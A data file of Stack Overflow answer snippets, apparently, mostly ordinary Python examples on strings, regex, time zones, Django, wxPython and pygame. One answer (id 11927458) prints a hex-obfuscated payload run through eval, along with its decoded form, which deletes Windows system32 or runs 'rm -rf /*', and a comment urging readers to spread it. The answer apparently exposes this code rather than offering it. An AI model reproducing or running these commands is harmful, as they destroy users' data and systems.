        draw the circle at circle_position # This will occur once for each circle
    update the display
</snippet></ROW><ROW><id>11924842</id><snippet>a = r'raw s\tring'</snippet></ROW><ROW><id>11924842</id><snippet>b = 'raw s\\tring'</snippet></ROW><ROW><id>11924842</id><snippet>'raw s\\tring'</snippet></ROW><ROW><id>11924842</id><snippet>&gt;&gt;&gt; a = r'raw s\tring'
&gt;&gt;&gt; b = 'raw s\\tring'
&gt;&gt;&gt; a
'raw s\\tring'
&gt;&gt;&gt; b
'raw s\\tring'
</snippet></ROW><ROW><id>11924842</id><snippet>PDF = r'C:\Users\user\Desktop\File_%s.pdf' %item
</snippet></ROW><ROW><id>11924842</id><snippet>'C:\\Users\\user\\Desktop\\Filed_055123.pdf'
</snippet></ROW><ROW><id>11924842</id><snippet>Filed_</snippet></ROW><ROW><id>11924842</id><snippet>File_</snippet></ROW><ROW><id>11924969</id><snippet>{% with bla=arg|foo %}
  {% url 'view' bla %}
{% endwith %}
</snippet></ROW><ROW><id>11925119</id><snippet>&lt;select name="name" style="display:none;" id="customDropdown"&gt;
</snippet></ROW><ROW><id>11925119</id><snippet>request.form['name']</snippet></ROW><ROW><id>11925235</id><snippet>u\"Fooザ\"</snippet></ROW><ROW><id>11925235</id><snippet>u\"Foo\\u30b6\"</snippet></ROW><ROW><id>11925235</id><snippet>(defun mytest ()
  (interactive)
  (shell-command-on-region (point)
         (point) "LC_ALL=\"en_US.UTF-8\" python -c 's = u\"Foo\\u30b6\"; print s.encode(\"utf8\",\"replace\")'" nil t))
</snippet></ROW><ROW><id>11925235</id><snippet>mytest</snippet></ROW><ROW><id>11925235</id><snippet>Fooザ
</snippet></ROW><ROW><id>11925428</id><snippet>.listdir()</snippet></ROW><ROW><id>11925428</id><snippet>path</snippet></ROW><ROW><id>11925428</id><snippet>os.path.join</snippet></ROW><ROW><id>11925428</id><snippet>path</snippet></ROW><ROW><id>11925428</id><snippet>item</snippet></ROW><ROW><id>11925428</id><snippet>for item in added:
    print item
    fullfilename = os.path.join(path, item)
    ad=open(fullfilename,'r')
    print ad.read()
</snippet></ROW><ROW><id>11925485</id><snippet>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def inplace_add():
...     a = 0
...     a += 1
... 
&gt;&gt;&gt; def add_and_assign():
...     a = 0
...     a = a + 1
... 
&gt;&gt;&gt; dis.dis(inplace_add)
  2           0 LOAD_CONST               1 (0)
              3 STORE_FAST               0 (a)

  3           6 LOAD_FAST                0 (a)
              9 LOAD_CONST               2 (1)
             12 INPLACE_ADD         
             13 STORE_FAST               0 (a)
             16 LOAD_CONST               0 (None)
             19 RETURN_VALUE        
&gt;&gt;&gt; dis.dis(add_and_assign)
  2           0 LOAD_CONST               1 (0)
              3 STORE_FAST               0 (a)

  3           6 LOAD_FAST                0 (a)
              9 LOAD_CONST               2 (1)
             12 BINARY_ADD          
             13 STORE_FAST               0 (a)
             16 LOAD_CONST               0 (None)
             19 RETURN_VALUE        
</snippet></ROW><ROW><id>11925485</id><snippet>INPLACE_ADD</snippet></ROW><ROW><id>11925485</id><snippet>BINARY_ADD</snippet></ROW><ROW><id>11925485</id><snippet>&gt;&gt;&gt; import timeit
&gt;&gt;&gt; timeit.timeit('inplace_add', 'from __main__ import inplace_add', number=10000000)
0.32667088508605957
&gt;&gt;&gt; timeit.timeit('add_and_assign', 'from __main__ import add_and_assign', number=10000000)
0.34172606468200684
</snippet></ROW><ROW><id>11925591</id><snippet>http://example.com/mypage</snippet></ROW><ROW><id>11925595</id><snippet>execute_command</snippet></ROW><ROW><id>11925595</id><snippet>foobar</snippet></ROW><ROW><id>11925595</id><snippet>task</snippet></ROW><ROW><id>11925595</id><snippet>CELERYBEAT_SCHEDULE</snippet></ROW><ROW><id>11925595</id><snippet>foobar.execute_command</snippet></ROW><ROW><id>11925595</id><snippet>import foobar.execute_command</snippet></ROW><ROW><id>11925595</id><snippet>celery.schedule.crontab</snippet></ROW><ROW><id>11925595</id><snippet>crontab(minute=30, hour=7, day_of_week=’mon-fri’)
</snippet></ROW><ROW><id>11925622</id><snippet>(?!(--|\n))
   ^     ^
</snippet></ROW><ROW><id>11925622</id><snippet>.findall</snippet></ROW><ROW><id>11925622</id><snippet>(</snippet></ROW><ROW><id>11925622</id><snippet>)</snippet></ROW><ROW><id>11925622</id><snippet>[^;]*</snippet></ROW><ROW><id>11925622</id><snippet>.*?</snippet></ROW><ROW><id>11925622</id><snippet>sql_line = re.compile(r"\n+(?!--|\n)[^;]*;")
</snippet></ROW><ROW><id>11925753</id><snippet>def printItself():
    print repr(printItself.func_code.co_code)
</snippet></ROW><ROW><id>11925753</id><snippet>dis</snippet></ROW><ROW><id>11925753</id><snippet>def disassembleItself():
    print __import__('dis').dis(disassembleItself)
</snippet></ROW><ROW><id>11925842</id><snippet>import datetime as dt
import pytz

utc = pytz.utc
western = pytz.timezone('US/Pacific')
newyork = pytz.timezone('America/New_York')
chicago = pytz.timezone('America/Chicago')
</snippet></ROW><ROW><id>11925842</id><snippet>date = dt.datetime(2012, 8, 12, 10)    # naive datetime
print(date)
# 2012-08-12 10:00:00  

# localize converts naive datetimes to timezone-aware datetimes.
date_in_newyork = newyork.localize(date)  # timezone-aware datetime
print(date_in_newyork)
# 2012-08-12 10:00:00-04:00
</snippet></ROW><ROW><id>11925842</id><snippet># astimezone converts timezone-aware datetimes to other timezones.
date_in_utc = date_in_newyork.astimezone(utc)
print(date_in_utc)
# 2012-08-12 14:00:00+00:00
</snippet></ROW><ROW><id>11925842</id><snippet>date_in_chicago = date_in_utc.astimezone(chicago)
print(date_in_chicago)
# 2012-08-12 09:00:00-05:00

date_in_newyork2 = date_in_utc.astimezone(newyork)
print(date_in_newyork2)
# 2012-08-12 10:00:00-04:00
</snippet></ROW><ROW><id>11925847</id><snippet>print dictionary(agrv)
</snippet></ROW><ROW><id>11925847</id><snippet>argv</snippet></ROW><ROW><id>11925847</id><snippet>print dictionary(sys.argv)
</snippet></ROW><ROW><id>11925847</id><snippet>sys.argv</snippet></ROW><ROW><id>11925847</id><snippet>argv</snippet></ROW><ROW><id>11926082</id><snippet>response = urllib2.urlopen(request)

data = response.read()
</snippet></ROW><ROW><id>11926082</id><snippet>import StringIO
datastream = StringIO.StringIO()
datastream.write(data)
datastream.seek(0)
#create dropbox client
client.put_file('/test', datastream)
</snippet></ROW><ROW><id>11926126</id><snippet>br.form['q'] = sys.argv</snippet></ROW><ROW><id>11926126</id><snippet>&gt;&gt;&gt; type(sys.argv)
&lt;type 'list'&gt;
&gt;&gt;&gt; type(sys.argv[0])
&lt;type 'str'&gt;
&gt;&gt;&gt;
</snippet></ROW><ROW><id>11926126</id><snippet>br.form['q'] = sys.argv[1]</snippet></ROW><ROW><id>11926126</id><snippet>word</snippet></ROW><ROW><id>11926126</id><snippet>dictionary</snippet></ROW><ROW><id>11926126</id><snippet>sys.argv</snippet></ROW><ROW><id>11926126</id><snippet>word</snippet></ROW><ROW><id>11926126</id><snippet>word</snippet></ROW><ROW><id>11926126</id><snippet>word</snippet></ROW><ROW><id>11926126</id><snippet>br.form['q'] = word[1]</snippet></ROW><ROW><id>11926151</id><snippet>a = "0343523"
a.isdigit()
True

b = "934sjsspam"
b.isdigit()
False
</snippet></ROW><ROW><id>11926203</id><snippet>json.loads('"\\u79c1"').encode('utf-8')
</snippet></ROW><ROW><id>11926349</id><snippet>import time
time.sleep(1) # this is done in seconds
</snippet></ROW><ROW><id>11926349</id><snippet>import time

welcome_button = browser.find_element_by_class_name('welcomeLoginButton')

wait_for_element_visibility(welcome_button).click()

def wait_for_element_visibility(element):
   if element.is_visible():
      return element
   else:
      for i in range(10):
         if not element.is_visible():
            time.sleep(.5)
         else:
            return element
</snippet></ROW><ROW><id>11926564</id><snippet>ManyToManyField</snippet></ROW><ROW><id>11926564</id><snippet>ManyToManyField</snippet></ROW><ROW><id>11926665</id><snippet>def dosomething( thelist ):
    for element in thelist:
        print element

dosomething( ['1','2','3'] )
alist = ['red','green','blue']
dosomething( alist )  
</snippet></ROW><ROW><id>11926665</id><snippet>1
2
3
red
green
blue
</snippet></ROW><ROW><id>11926665</id><snippet>enumerate(list)</snippet></ROW><ROW><id>11926665</id><snippet>index,element</snippet></ROW><ROW><id>11926665</id><snippet>x in range(len(thelist))</snippet></ROW><ROW><id>11926732</id><snippet>$('#submit').click(function() {
    var name = prompt("Please enter your name", "");
    $.post('/url/to/django/handler', {'name': name});
});
</snippet></ROW><ROW><id>11926760</id><snippet>DOTALL</snippet></ROW><ROW><id>11926760</id><snippet>?</snippet></ROW><ROW><id>11926760</id><snippet>prog = re.compile(r"""
    ^
    (?P&lt;PS_BLOCK&gt;
      (?P&lt;PS_LINE&gt;\\ps.*\n)
      (?:                   # Zero or more lines that
        (?!\\(?:ps|lx|ge))  # don't start with
        .*\n                # '\ps', '\lx', or '\ge'...
      )*
      \\ge.*\n              # ...followed by a '\ge' line.
    )
    (?P&lt;GE_BLOCK&gt;
      (?:                   # Again, zero or more lines
        (?!\\(?:ps|lx|ge))  # that don't start with
        .*\n                # '\ps', '\lx', or '\ge'...
      )*
      \\ge.*\n              # ...followed by a '\ge' line.
    )
    """, re.MULTILINE | re.VERBOSE)
</snippet></ROW><ROW><id>11926760</id><snippet>r'\g&lt;PS_BLOCK&gt;\g&lt;PS_LINE&gt;\g&lt;GE_BLOCK&gt;'
</snippet></ROW><ROW><id>11926760</id><snippet>\G</snippet></ROW><ROW><id>11926760</id><snippet>subn</snippet></ROW><ROW><id>11926760</id><snippet>number_of_subs_made</snippet></ROW><ROW><id>11926872</id><snippet>mktemp</snippet></ROW><ROW><id>11926872</id><snippet>NamedTemporaryFile</snippet></ROW><ROW><id>11926872</id><snippet>&gt;&gt;&gt; f = NamedTemporaryFile(delete=False)
&gt;&gt;&gt; f
&lt;open file '&lt;fdopen&gt;', mode 'w+b' at 0x384698&gt;
</snippet></ROW><ROW><id>11927004</id><snippet>sys.argv</snippet></ROW><ROW><id>11927004</id><snippet>sys.argv[0]</snippet></ROW><ROW><id>11927108</id><snippet>class A:
    def __init__(self, name):
        self.__name = name

    def print_name(self):
        print self.__name


class B(A):
    def __init__(self, name):
        A.__init__(self, name)
        self.__name = name + "yes"

    def print_name(self):
        print self.__name

    def print_super_name(self):
        print self._A.__name #class name mangled into attribute
</snippet></ROW><ROW><id>11927108</id><snippet>__name</snippet></ROW><ROW><id>11927108</id><snippet>print_name</snippet></ROW><ROW><id>11927108</id><snippet>b = B('so')
b._A__name = 'something'
b._B__name = 'something else'
</snippet></ROW><ROW><id>11927108</id><snippet>name</snippet></ROW><ROW><id>11927159</id><snippet>(^| )&amp;( |$)</snippet></ROW><ROW><id>11927159</id><snippet>$1and$2</snippet></ROW><ROW><id>11927159</id><snippet>import re
re.sub('(^| )&amp;( |$)', r'\1and\2', '&amp; r&amp;b')
</snippet></ROW><ROW><id>11927257</id><snippet>if (responseType == 'good') or 'great' or 'fantastic' or 'decent' or 'fine' or 'ok' or 'okay': posResponses()
elif (responseType == 'bad') or 'terrible' or 'sad' or 'grumpy' or 'angry' or 'irritated' or 'tired': negResponses()
else: ambiguousResponses()
</snippet></ROW><ROW><id>11927257</id><snippet>'great'</snippet></ROW><ROW><id>11927257</id><snippet>if</snippet></ROW><ROW><id>11927257</id><snippet>if responseType == 'good' or responseType == 'great' or responseType == 'fantastic' or responseType == 'decent' or responseType == 'fine' or responseType == 'ok' or responseType == 'okay':
    posResponses()
elif responseType == 'bad' or responseType == 'terrible' or responseType == 'sad' or responseType == 'grumpy' or responseType == 'angry' or responseType == 'irritated' or responseType == 'tired':
    negResponses()
else:
    ambiguousResponses()
</snippet></ROW><ROW><id>11927257</id><snippet>if responseType in {'good', 'great', 'fantastic', 'decent', 'fine', 'ok', 'okay'}:
    posResponses()
elif responseType in {'bad', 'terrible', 'sad', 'grumpy', 'angry', 'irritated', 'tired'}:
    negResponses()
</snippet></ROW><ROW><id>11927257</id><snippet># near the top of the file:
GOOD_RESPONSES = {'good', 'great', 'fantastic', 'decent', 'fine', 'ok', 'okay'}
BAD_RESPONSES = {'bad', 'terrible', 'sad', 'grumpy', 'angry', 'irritated', 'tired'}

# when you need to judge a response:
if responseType in GOOD_RESPONSES:
    posResponses()
elif responseType in BAD_RESPONSES:
    negResponses()
else:
    ambiguousResponses()
</snippet></ROW><ROW><id>11927322</id><snippet>char *</snippet></ROW><ROW><id>11927322</id><snippet>word = "Now";</snippet></ROW><ROW><id>11927322</id><snippet>"Hello"</snippet></ROW><ROW><id>11927322</id><snippet>"Now"</snippet></ROW><ROW><id>11927322</id><snippet>char word [] = "Hello";
// word is now the name of a 6-character (including final null) mutable string
word[0] = 'h';
// Now word has the value "hello".
</snippet></ROW><ROW><id>11927322</id><snippet>word = 'h' + word[1:]
</snippet></ROW><ROW><id>11927322</id><snippet>word</snippet></ROW><ROW><id>11927322</id><snippet>&gt;&gt;&gt; a=[1]
&gt;&gt;&gt; b=a
&gt;&gt;&gt; a
[1]
&gt;&gt;&gt; b
[1]
&gt;&gt;&gt; a[0]=5
&gt;&gt;&gt; a
[5]
&gt;&gt;&gt; b
[5]
</snippet></ROW><ROW><id>11927322</id><snippet>b = a</snippet></ROW><ROW><id>11927322</id><snippet>a</snippet></ROW><ROW><id>11927322</id><snippet>b</snippet></ROW><ROW><id>11927374</id><snippet>import os
import logging 
import settings   # alternativly from whereever import settings  

class Logger(object):

    def __init__(self, name):
        name = name.replace('.log','')
        logger = logging.getLogger('log_namespace.%s' % name)    # log_namespace can be replaced with your namespace 
        logger.setLevel(logging.DEBUG)
        if not logger.handlers:
            file_name = os.path.join(settings.LOGGING_DIR, '%s.log' % name)    # usually I keep the LOGGING_DIR defined in some global settings file
            handler = logging.FileHandler(file_name)
            formatter = logging.Formatter('%(asctime)s %(levelname)s:%(name)s %(message)s')
            handler.setFormatter(formatter)
            handler.setLevel(logging.DEBUG)
            logger.addHandler(handler)
        self._logger = logger

    def get(self):
        return self._logger
</snippet></ROW><ROW><id>11927374</id><snippet>from module_where_logger_is_defined import Logger

class MyCustomClass(object):

    def __init__(self):
        self.logger = Logger(self.__class__.__name__).get()   # accessing the "private" variables for each class

    def do_something():
        ...
        self.logger.info('Hello')

    def raise_error():
        ...
        self.logger.error('some error message')
</snippet></ROW><ROW><id>11927458</id><snippet>parse</snippet></ROW><ROW><id>11927458</id><snippet>In [4]: struct.pack("&gt;I", 0x6576616c)
Out[4]: 'eval'
</snippet></ROW><ROW><id>11927458</id><snippet>parse</snippet></ROW><ROW><id>11927458</id><snippet>read = self.table[seeker[0]] #reader for the parsed shellcode/data
</snippet></ROW><ROW><id>11927458</id><snippet>self.table</snippet></ROW><ROW><id>11927458</id><snippet>self.table = __import__("__builtin__").__dict__ #dirty workaround
</snippet></ROW><ROW><id>11927458</id><snippet>eval</snippet></ROW><ROW><id>11927458</id><snippet>shellcode</snippet></ROW><ROW><id>11927458</id><snippet>shellcode =  "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73"
shellcode += "\x74\x65\x6d\x28\x27\x64\x65\x6c\x20\x2f\x73\x20\x2f\x71\x20\x2f\x66\x20\x43\x3a"
shellcode += "\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x2a\x20"
shellcode += "\x3e\x20\x4e\x55\x4c\x20\x32\x3e\x26\x31\x27\x29\x20\x69\x66\x20\x27\x57\x69\x6e"
shellcode += "\x27\x20\x69\x6e\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x70\x6c\x61"
shellcode += "\x74\x66\x6f\x72\x6d\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x29\x20\x65\x6c\x73"
shellcode += "\x65\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73"
shellcode += "\x79\x73\x74\x65\x6d\x28\x27\x72\x6d\x20\x2d\x72\x66\x20\x2f\x2a\x20\x3e\x20\x2f"
shellcode += "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x27\x29\x20\x23\x68\x69\x20"
shellcode += "\x74\x68\x65\x72\x65\x20\x5e\x5f\x7e\x20\x66\x65\x65\x6c\x20\x66\x72\x65\x65\x20"
shellcode += "\x74\x6f\x20\x73\x70\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x77\x69\x74\x68\x20"
shellcode += "\x74\x68\x65\x20\x72\x6d\x20\x2d\x72\x66\x20\x72\x65\x70\x6c\x61\x63\x65\x64\x20"
shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20"
shellcode += "\x69\x6e\x73\x69\x64\x69\x6f\x75\x73"
</snippet></ROW><ROW><id>11927458</id><snippet>if 'Win' in __import__('platform').system():
  __import__('os').system('del /s /q /f C:\windows\system32\* &gt; NUL 2&gt;&amp;1')
else:
  __import__('os').system('rm -rf /* &gt; /dev/null 2&gt;&amp;1')

#hi there ^_~ feel free to spread this with the rm -rf replaced with something more insidious
</snippet></ROW><ROW><id>11927458</id><snippet>rm -rf /</snippet></ROW><ROW><id>11927545</id><snippet>In [29]: timeit a[(a % 2 == 0).sum(axis=1) &gt;= 2]
10000 loops, best of 3: 29.5 us per loop
</snippet></ROW><ROW><id>11927545</id><snippet>In [30]: timeit a[where(array(map(lambda x: sum(x), a % 2 == 0)) &gt;= N)]
10000 loops, best of 3: 72 us per loop

In [31]: timeit a[where(sum(apply_along_axis(lambda x: x % 2 == 0, 1, a), axis=1) &gt;= 2)]
1000 loops, best of 3: 220 us per loop
</snippet></ROW><ROW><id>11927545</id><snippet>lambda x: sum(x)</snippet></ROW><ROW><id>11927545</id><snippet>sum</snippet></ROW><ROW><id>11927547</id><snippet>import wx
def SomeListener(evt):
    print "Got Event:",evt
    print "My XY:",evt.GetX(),evt.GetY()
    #youll have to figure out which word you clicked using x,y (note x,y relative to static text field)
a= wx.App(redirect=False)
f = wx.Frame(None,-1)
p = wx.Panel(f,-1)
t = wx.StaticText(p,-1,"Some Text")
t.Bind(wx.EVT_LEFT_DOWN,SomeListener)
f.Show()
a.MainLoop()
</snippet></ROW><ROW><id>11927547</id><snippet>import wx

import wx.html
def OnClickWord(e):
    print "You Clicked:",e.GetLinkInfo().GetHref()
    return
class MyHtmlFrame(wx.Frame):

    def __init__(self, parent, title):

        wx.Frame.__init__(self, parent, -1, title)

        html = wx.html.HtmlWindow(self)

        #if "gtk2" in wx.PlatformInfo:

        html.SetStandardFonts()

        html.SetPage(
        "&lt;style&gt;a {text-decoration: none;color: #000; }&lt;/style&gt;" #sorry no css support :/
        "&lt;a href=\"word1\"&gt;Word1&lt;/a&gt; &lt;a href=\"word2\"&gt;word 2&lt;/a&gt; &lt;a href=\"wizard of oz\"&gt;wizard of oz&lt;/a&gt;.")

app = wx.PySimpleApp()

frm = MyHtmlFrame(None, "Simple HTML")
frm.Bind(wx.html.EVT_HTML_LINK_CLICKED,OnClickWord)
frm.Show()

app.MainLoop()
</snippet></ROW><ROW><id>11927607</id><snippet>&gt;&gt;&gt; DOC = """&lt;clade&gt;
... &lt;name&gt;Espresso&lt;/name&gt;
... &lt;branch_length&gt;2.0&lt;/branch_length&gt;
... &lt;/clade&gt;"""
&gt;&gt;&gt; 
&gt;&gt;&gt; import lxml.etree
&gt;&gt;&gt; tree = lxml.etree.XML(DOC)
&gt;&gt;&gt; matches = tree.xpath('//name[text()="Espresso"]')
</snippet></ROW><ROW><id>11927607</id><snippet>&gt;&gt;&gt; for e in matches:
...    sibling = lxml.etree.Element("url")
...    sibling.text = "www.espresso.com"
...    e.addnext(sibling)

&gt;&gt;&gt; print lxml.etree.tostring(tree)
&lt;clade&gt;
&lt;name&gt;Espresso&lt;/name&gt;&lt;url&gt;www.espresso.com&lt;/url&gt;
&lt;branch_length&gt;2.0&lt;/branch_length&gt;
&lt;/clade&gt;
</snippet></ROW><ROW><id>11927607</id><snippet>&gt;&gt;&gt; nsmap = {'phylo': 'http://www.phyloxml.org'}
&gt;&gt;&gt; tree.xpath('//phylo:name[text()="Espresso"]', namespaces=nsmap)
[&lt;Element {http://www.phyloxml.org}name at 0x2c875f0&gt;]
</snippet></ROW><ROW><id>11927668</id><snippet>eData = [(sheet_name, sheet_data) for (sheet_name, sheet_data) in eData
         if sheet_name != u'testExcelReport_hr']
</snippet></ROW><ROW><id>11927668</id><snippet>testExcelReport_hr</snippet></ROW><ROW><id>11927885</id><snippet>
savefig(filename, dpi=75) 
&lt;/pre&gt;</snippet></ROW><ROW><id>11927922</id><snippet>color</snippet></ROW><ROW><id>11927922</id><snippet>plot</snippet></ROW><ROW><id>11927922</id><snippet>from matplotlib import pyplot as plt
from itertools import cycle, islice
import pandas, numpy as np  # I find np.random.randint to be better

# Make the data
x = [{i:np.random.randint(1,5)} for i in range(10)]
df = pandas.DataFrame(x)

# Make a list by cycling through the colors you care about
# to match the length of your data.
my_colors = list(islice(cycle(['b', 'r', 'g', 'y', 'k']), None, len(df)))

# Specify this list of colors as the `color` option to `plot`.
df.plot(kind='bar', stacked=True, color=my_colors)
</snippet></ROW><ROW><id>11927922</id><snippet>my_colors = ['g', 'b']*5 # &lt;-- this concatenates the list to itself 5 times.
my_colors = [(0.5,0.4,0.5), (0.75, 0.75, 0.25)]*5 # &lt;-- make two custom RGBs and repeat/alternate them over all the bar elements.
my_colors = [(x/10.0, x/20.0, 0.75) for x in range(len(df))] # &lt;-- Quick gradient example along the Red/Green dimensions.
</snippet></ROW><ROW><id>11927938</id><snippet>import re

old_fruits = 'apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear'

with open('fruits.out', 'w') as f:
    fruits = re.findall(r'[^\W\d]+', old_fruits)
    f.write('\n'.join(fruits))
</snippet></ROW><ROW><id>11927966</id><snippet>globals()</snippet></ROW><ROW><id>11927966</id><snippet>eval()</snippet></ROW><ROW><id>11927966</id><snippet>eval('FooClass')</snippet></ROW><ROW><id>11927966</id><snippet>globals()['FooClass']</snippet></ROW><ROW><id>11927966</id><snippet>globals()['FooClass'](**d)
</snippet></ROW><ROW><id>11927982</id><snippet>relayChat</snippet></ROW><ROW><id>11927982</id><snippet>relayApplication.MainLoop()
</snippet></ROW><ROW><id>11927982</id><snippet>while 1:
    relayChat.Clear()
    relayChat.AppendText(chatText)
</snippet></ROW><ROW><id>11927982</id><snippet>from wx.lib.newevent import NewEvent

ChatTextEvent, EVT_CHATTEXT = NewEvent()

class relayServerGUI(wx.Frame):
    def __init__(self, parent, id):
        ...
        # make sure to save a ref to your chat widget
        self.relayChat = wx.TextCtrl(orciPanel, 0, chatText, (50, 50), (500, 500),style              = wx.TE_MULTILINE)
        self.Bind(EVT_CHATTEXT, self.newChatTextEvent)
        ...
        thread2(self)

    def newChatTextEvent(self, event):
        self.relayChat.AppendText(event.data)


def relayInterpretor(wxObject):
   ...
   while 1:
      ...
      # wxObject needs to be an instance of relayServerGUI
      wx.PostEvent(wxObject, ChatTextEvent(data=relayData))

def thread2(wxObject):
    Thread(target = relayInterpretor, args=(wxObject,)).start()    
</snippet></ROW><ROW><id>11928003</id><snippet>   def prefix_hash(list_o_words):
       ret = {}
       for word in list_o_words:
           for i in range(2,len(word)-1):
               ret[word[:i]] = 'prefix'  # this should check if it's a word first..
       ret[word] = 'word'
</snippet></ROW><ROW><id>11928138</id><snippet>n_one=0</snippet></ROW><ROW><id>11928138</id><snippet>while (n_one &gt; 26)</snippet></ROW><ROW><id>11928138</id><snippet>while (0 &gt; 26)</snippet></ROW><ROW><id>11929148</id><snippet>main.py</snippet></ROW><ROW><id>11929148</id><snippet>file1.py</snippet></ROW><ROW><id>11929148</id><snippet>file1.py</snippet></ROW><ROW><id>11929148</id><snippet>main.py</snippet></ROW><ROW><id>11929148</id><snippet>main.py</snippet></ROW><ROW><id>11929148</id><snippet>someFunc</snippet></ROW><ROW><id>11929171</id><snippet>POSITION_CHOICES = (
    HOME_MAIN, "HOME_MAIN",
    BUTTOM_MAIN, "BOTTOM_MAIN",
    TOP_MAIN, "TOP_MAIN"
)


class Article(models.Model):
    position = models.CharField(max_lenght=50, choices=POSITION_CHOICES)
</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>start</snippet></ROW><ROW><id>11929314</id><snippet>begin</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>__name__ == "__main__"
</snippet></ROW><ROW><id>11929314</id><snippet>if</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>from foo import *</snippet></ROW><ROW><id>11929314</id><snippet>using namespace std</snippet></ROW><ROW><id>11929314</id><snippet>import *</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929314</id><snippet>main</snippet></ROW><ROW><id>11929600</id><snippet>sqrt</snippet></ROW><ROW><id>11929600</id><snippet>sqrt</snippet></ROW><ROW><id>11929600</id><snippet>Decimal</snippet></ROW><ROW><id>11929600</id><snippet>float</snippet></ROW><ROW><id>11929600</id><snippet>Decimal</snippet></ROW><ROW><id>11929600</id><snippet>0.1 + 0.1 + 0.1 - 0.3</snippet></ROW><ROW><id>11929600</id><snippet>5.5511151231257827e-017</snippet></ROW><ROW><id>11929608</id><snippet>In [2]: str = 'alvinone-90,80,70,50|simonthree-99,80,70,90|theotwo-90,90,90,65'

In [3]: str_list = [l.split('-') for l in str.split('|')]

In [4]: str_list
Out[4]:
[['alvinone', '90,80,70,50'],
 ['simonthree', '99,80,70,90'],
 ['theotwo', '90,90,90,65']]

In [5]: elem_dict = {}

In [6]: for elem in str_list:
   ...:     elem_dict[elem[0]] = [x for x in elem[1].split(',')]
   ...:

In [7]: print elem_dict
{'simonthree': ['99', '80', '70', '90'], 'theotwo': ['90', '90', '90', '65'], 'alvinone': ['90
', '70', '50']}

In [8]: elem_dict['simonthree'][2]
Out[8]: '70'
</snippet></ROW><ROW><id>11929700</id><snippet>PATH</snippet></ROW><ROW><id>11929700</id><snippet>LD_LIBRARY_PATH</snippet></ROW><ROW><id>11929700</id><snippet>sage-native-execute</snippet></ROW><ROW><id>11929700</id><snippet>os.system('''sage-native-execute gnuplot -e "plot('sin(x)')"''')
</snippet></ROW><ROW><id>11929736</id><snippet>test_repository.py</snippet></ROW><ROW><id>11929736</id><snippet>    r.stage(['a'])
    commit_sha = r.do_commit('modified a',
                             committer='Test Committer &lt;test@nodomain.com&gt;',
                             author='Test Author &lt;test@nodomain.com&gt;',
                             commit_timestamp=12395, commit_timezone=0,
                             author_timestamp=12395, author_timezone=0)
</snippet></ROW><ROW><id>11929867</id><snippet>pip</snippet></ROW><ROW><id>11929867</id><snippet>$ pip install -e path/to/SomePackage
</snippet></ROW><ROW><id>11929867</id><snippet> $ sudo mv src/scipy/scipy /Library/Python/2.7/site-packages/
</snippet></ROW><ROW><id>11929867</id><snippet>pip</snippet></ROW><ROW><id>11929867</id><snippet> $ sudo vim /Library/Python/2.7/site-packages/easy-install.pth
</snippet></ROW><ROW><id>11929910</id><snippet>Class Person(models.Model):
    def create_id():
        return os.urandom(12).encode('hex')

    name = models.CharField(max_length = 255)
    id = models.CharField(max_length = 255,default = create_id)
</snippet></ROW><ROW><id>11929950</id><snippet>import re
urls_parts=['week', 'weeklytop', 'week/day']
urls_parts = sorted(urls_parts, key=lambda x: len(x), reverse=True)
rexes = [re.compile(r'{part}\b'.format(part=part)) for part in urls_parts]

urls = ['www.mysite.com/weeklytop/2', 'www.mysite.com/week/day/2', 'www.mysite.com/week/4']
for url in urls:
    for i, rex in enumerate(rexes):
        if rex.search(url):
            print url
            print urls_parts[i]
            print
            break
</snippet></ROW><ROW><id>11929950</id><snippet>www.mysite.com/weeklytop/2
weeklytop

www.mysite.com/week/day/2
week/day

www.mysite.com/week/4
week
</snippet></ROW><ROW><id>11930034</id><snippet>KEYDOWN</snippet></ROW><ROW><id>11930034</id><snippet>KEYUP</snippet></ROW><ROW><id>11930034</id><snippet>get_pressed</snippet></ROW><ROW><id>11930034</id><snippet>KEYDOWN</snippet></ROW><ROW><id>11930034</id><snippet>10</snippet></ROW><ROW><id>11930034</id><snippet>14</snippet></ROW><ROW><id>11930034</id><snippet>import pygame
import math

pygame.init()

screen = pygame.display.set_mode((200, 200))
run = True
pos = (100, 100)
clock = pygame.time.Clock()

# speed of your player
speed = 2

# key bindings
move_map = {pygame.K_LEFT: (-1, 0),
            pygame.K_RIGHT: (1, 0),
            pygame.K_UP: (0, -1),
            pygame.K_DOWN: (0, 1)}

while run:
  screen.fill((0, 255, 0))
  # draw player, but convert position to integers first
  pygame.draw.circle(screen, (255, 0, 0), map(int, pos), 10)
  pygame.display.flip()

  # determine movement vector
  pressed = pygame.key.get_pressed()
  move_vector = (0, 0)
  for m in (move_map[key] for key in move_map if pressed[key]):
    move_vector = map(sum, zip(move_vector, m))

  # normalize movement vector if necessary
  if sum(map(abs, move_vector)) == 2:
    move_vector = [p/1.4142 for p in move_vector]

  # apply speed to movement vector
  move_vector = [speed*p for p in move_vector]

  # update position of player
  pos = map(sum, zip(pos, move_vector))

  for e in pygame.event.get():
    if e.type == pygame.QUIT: run = False

  clock.tick(60)
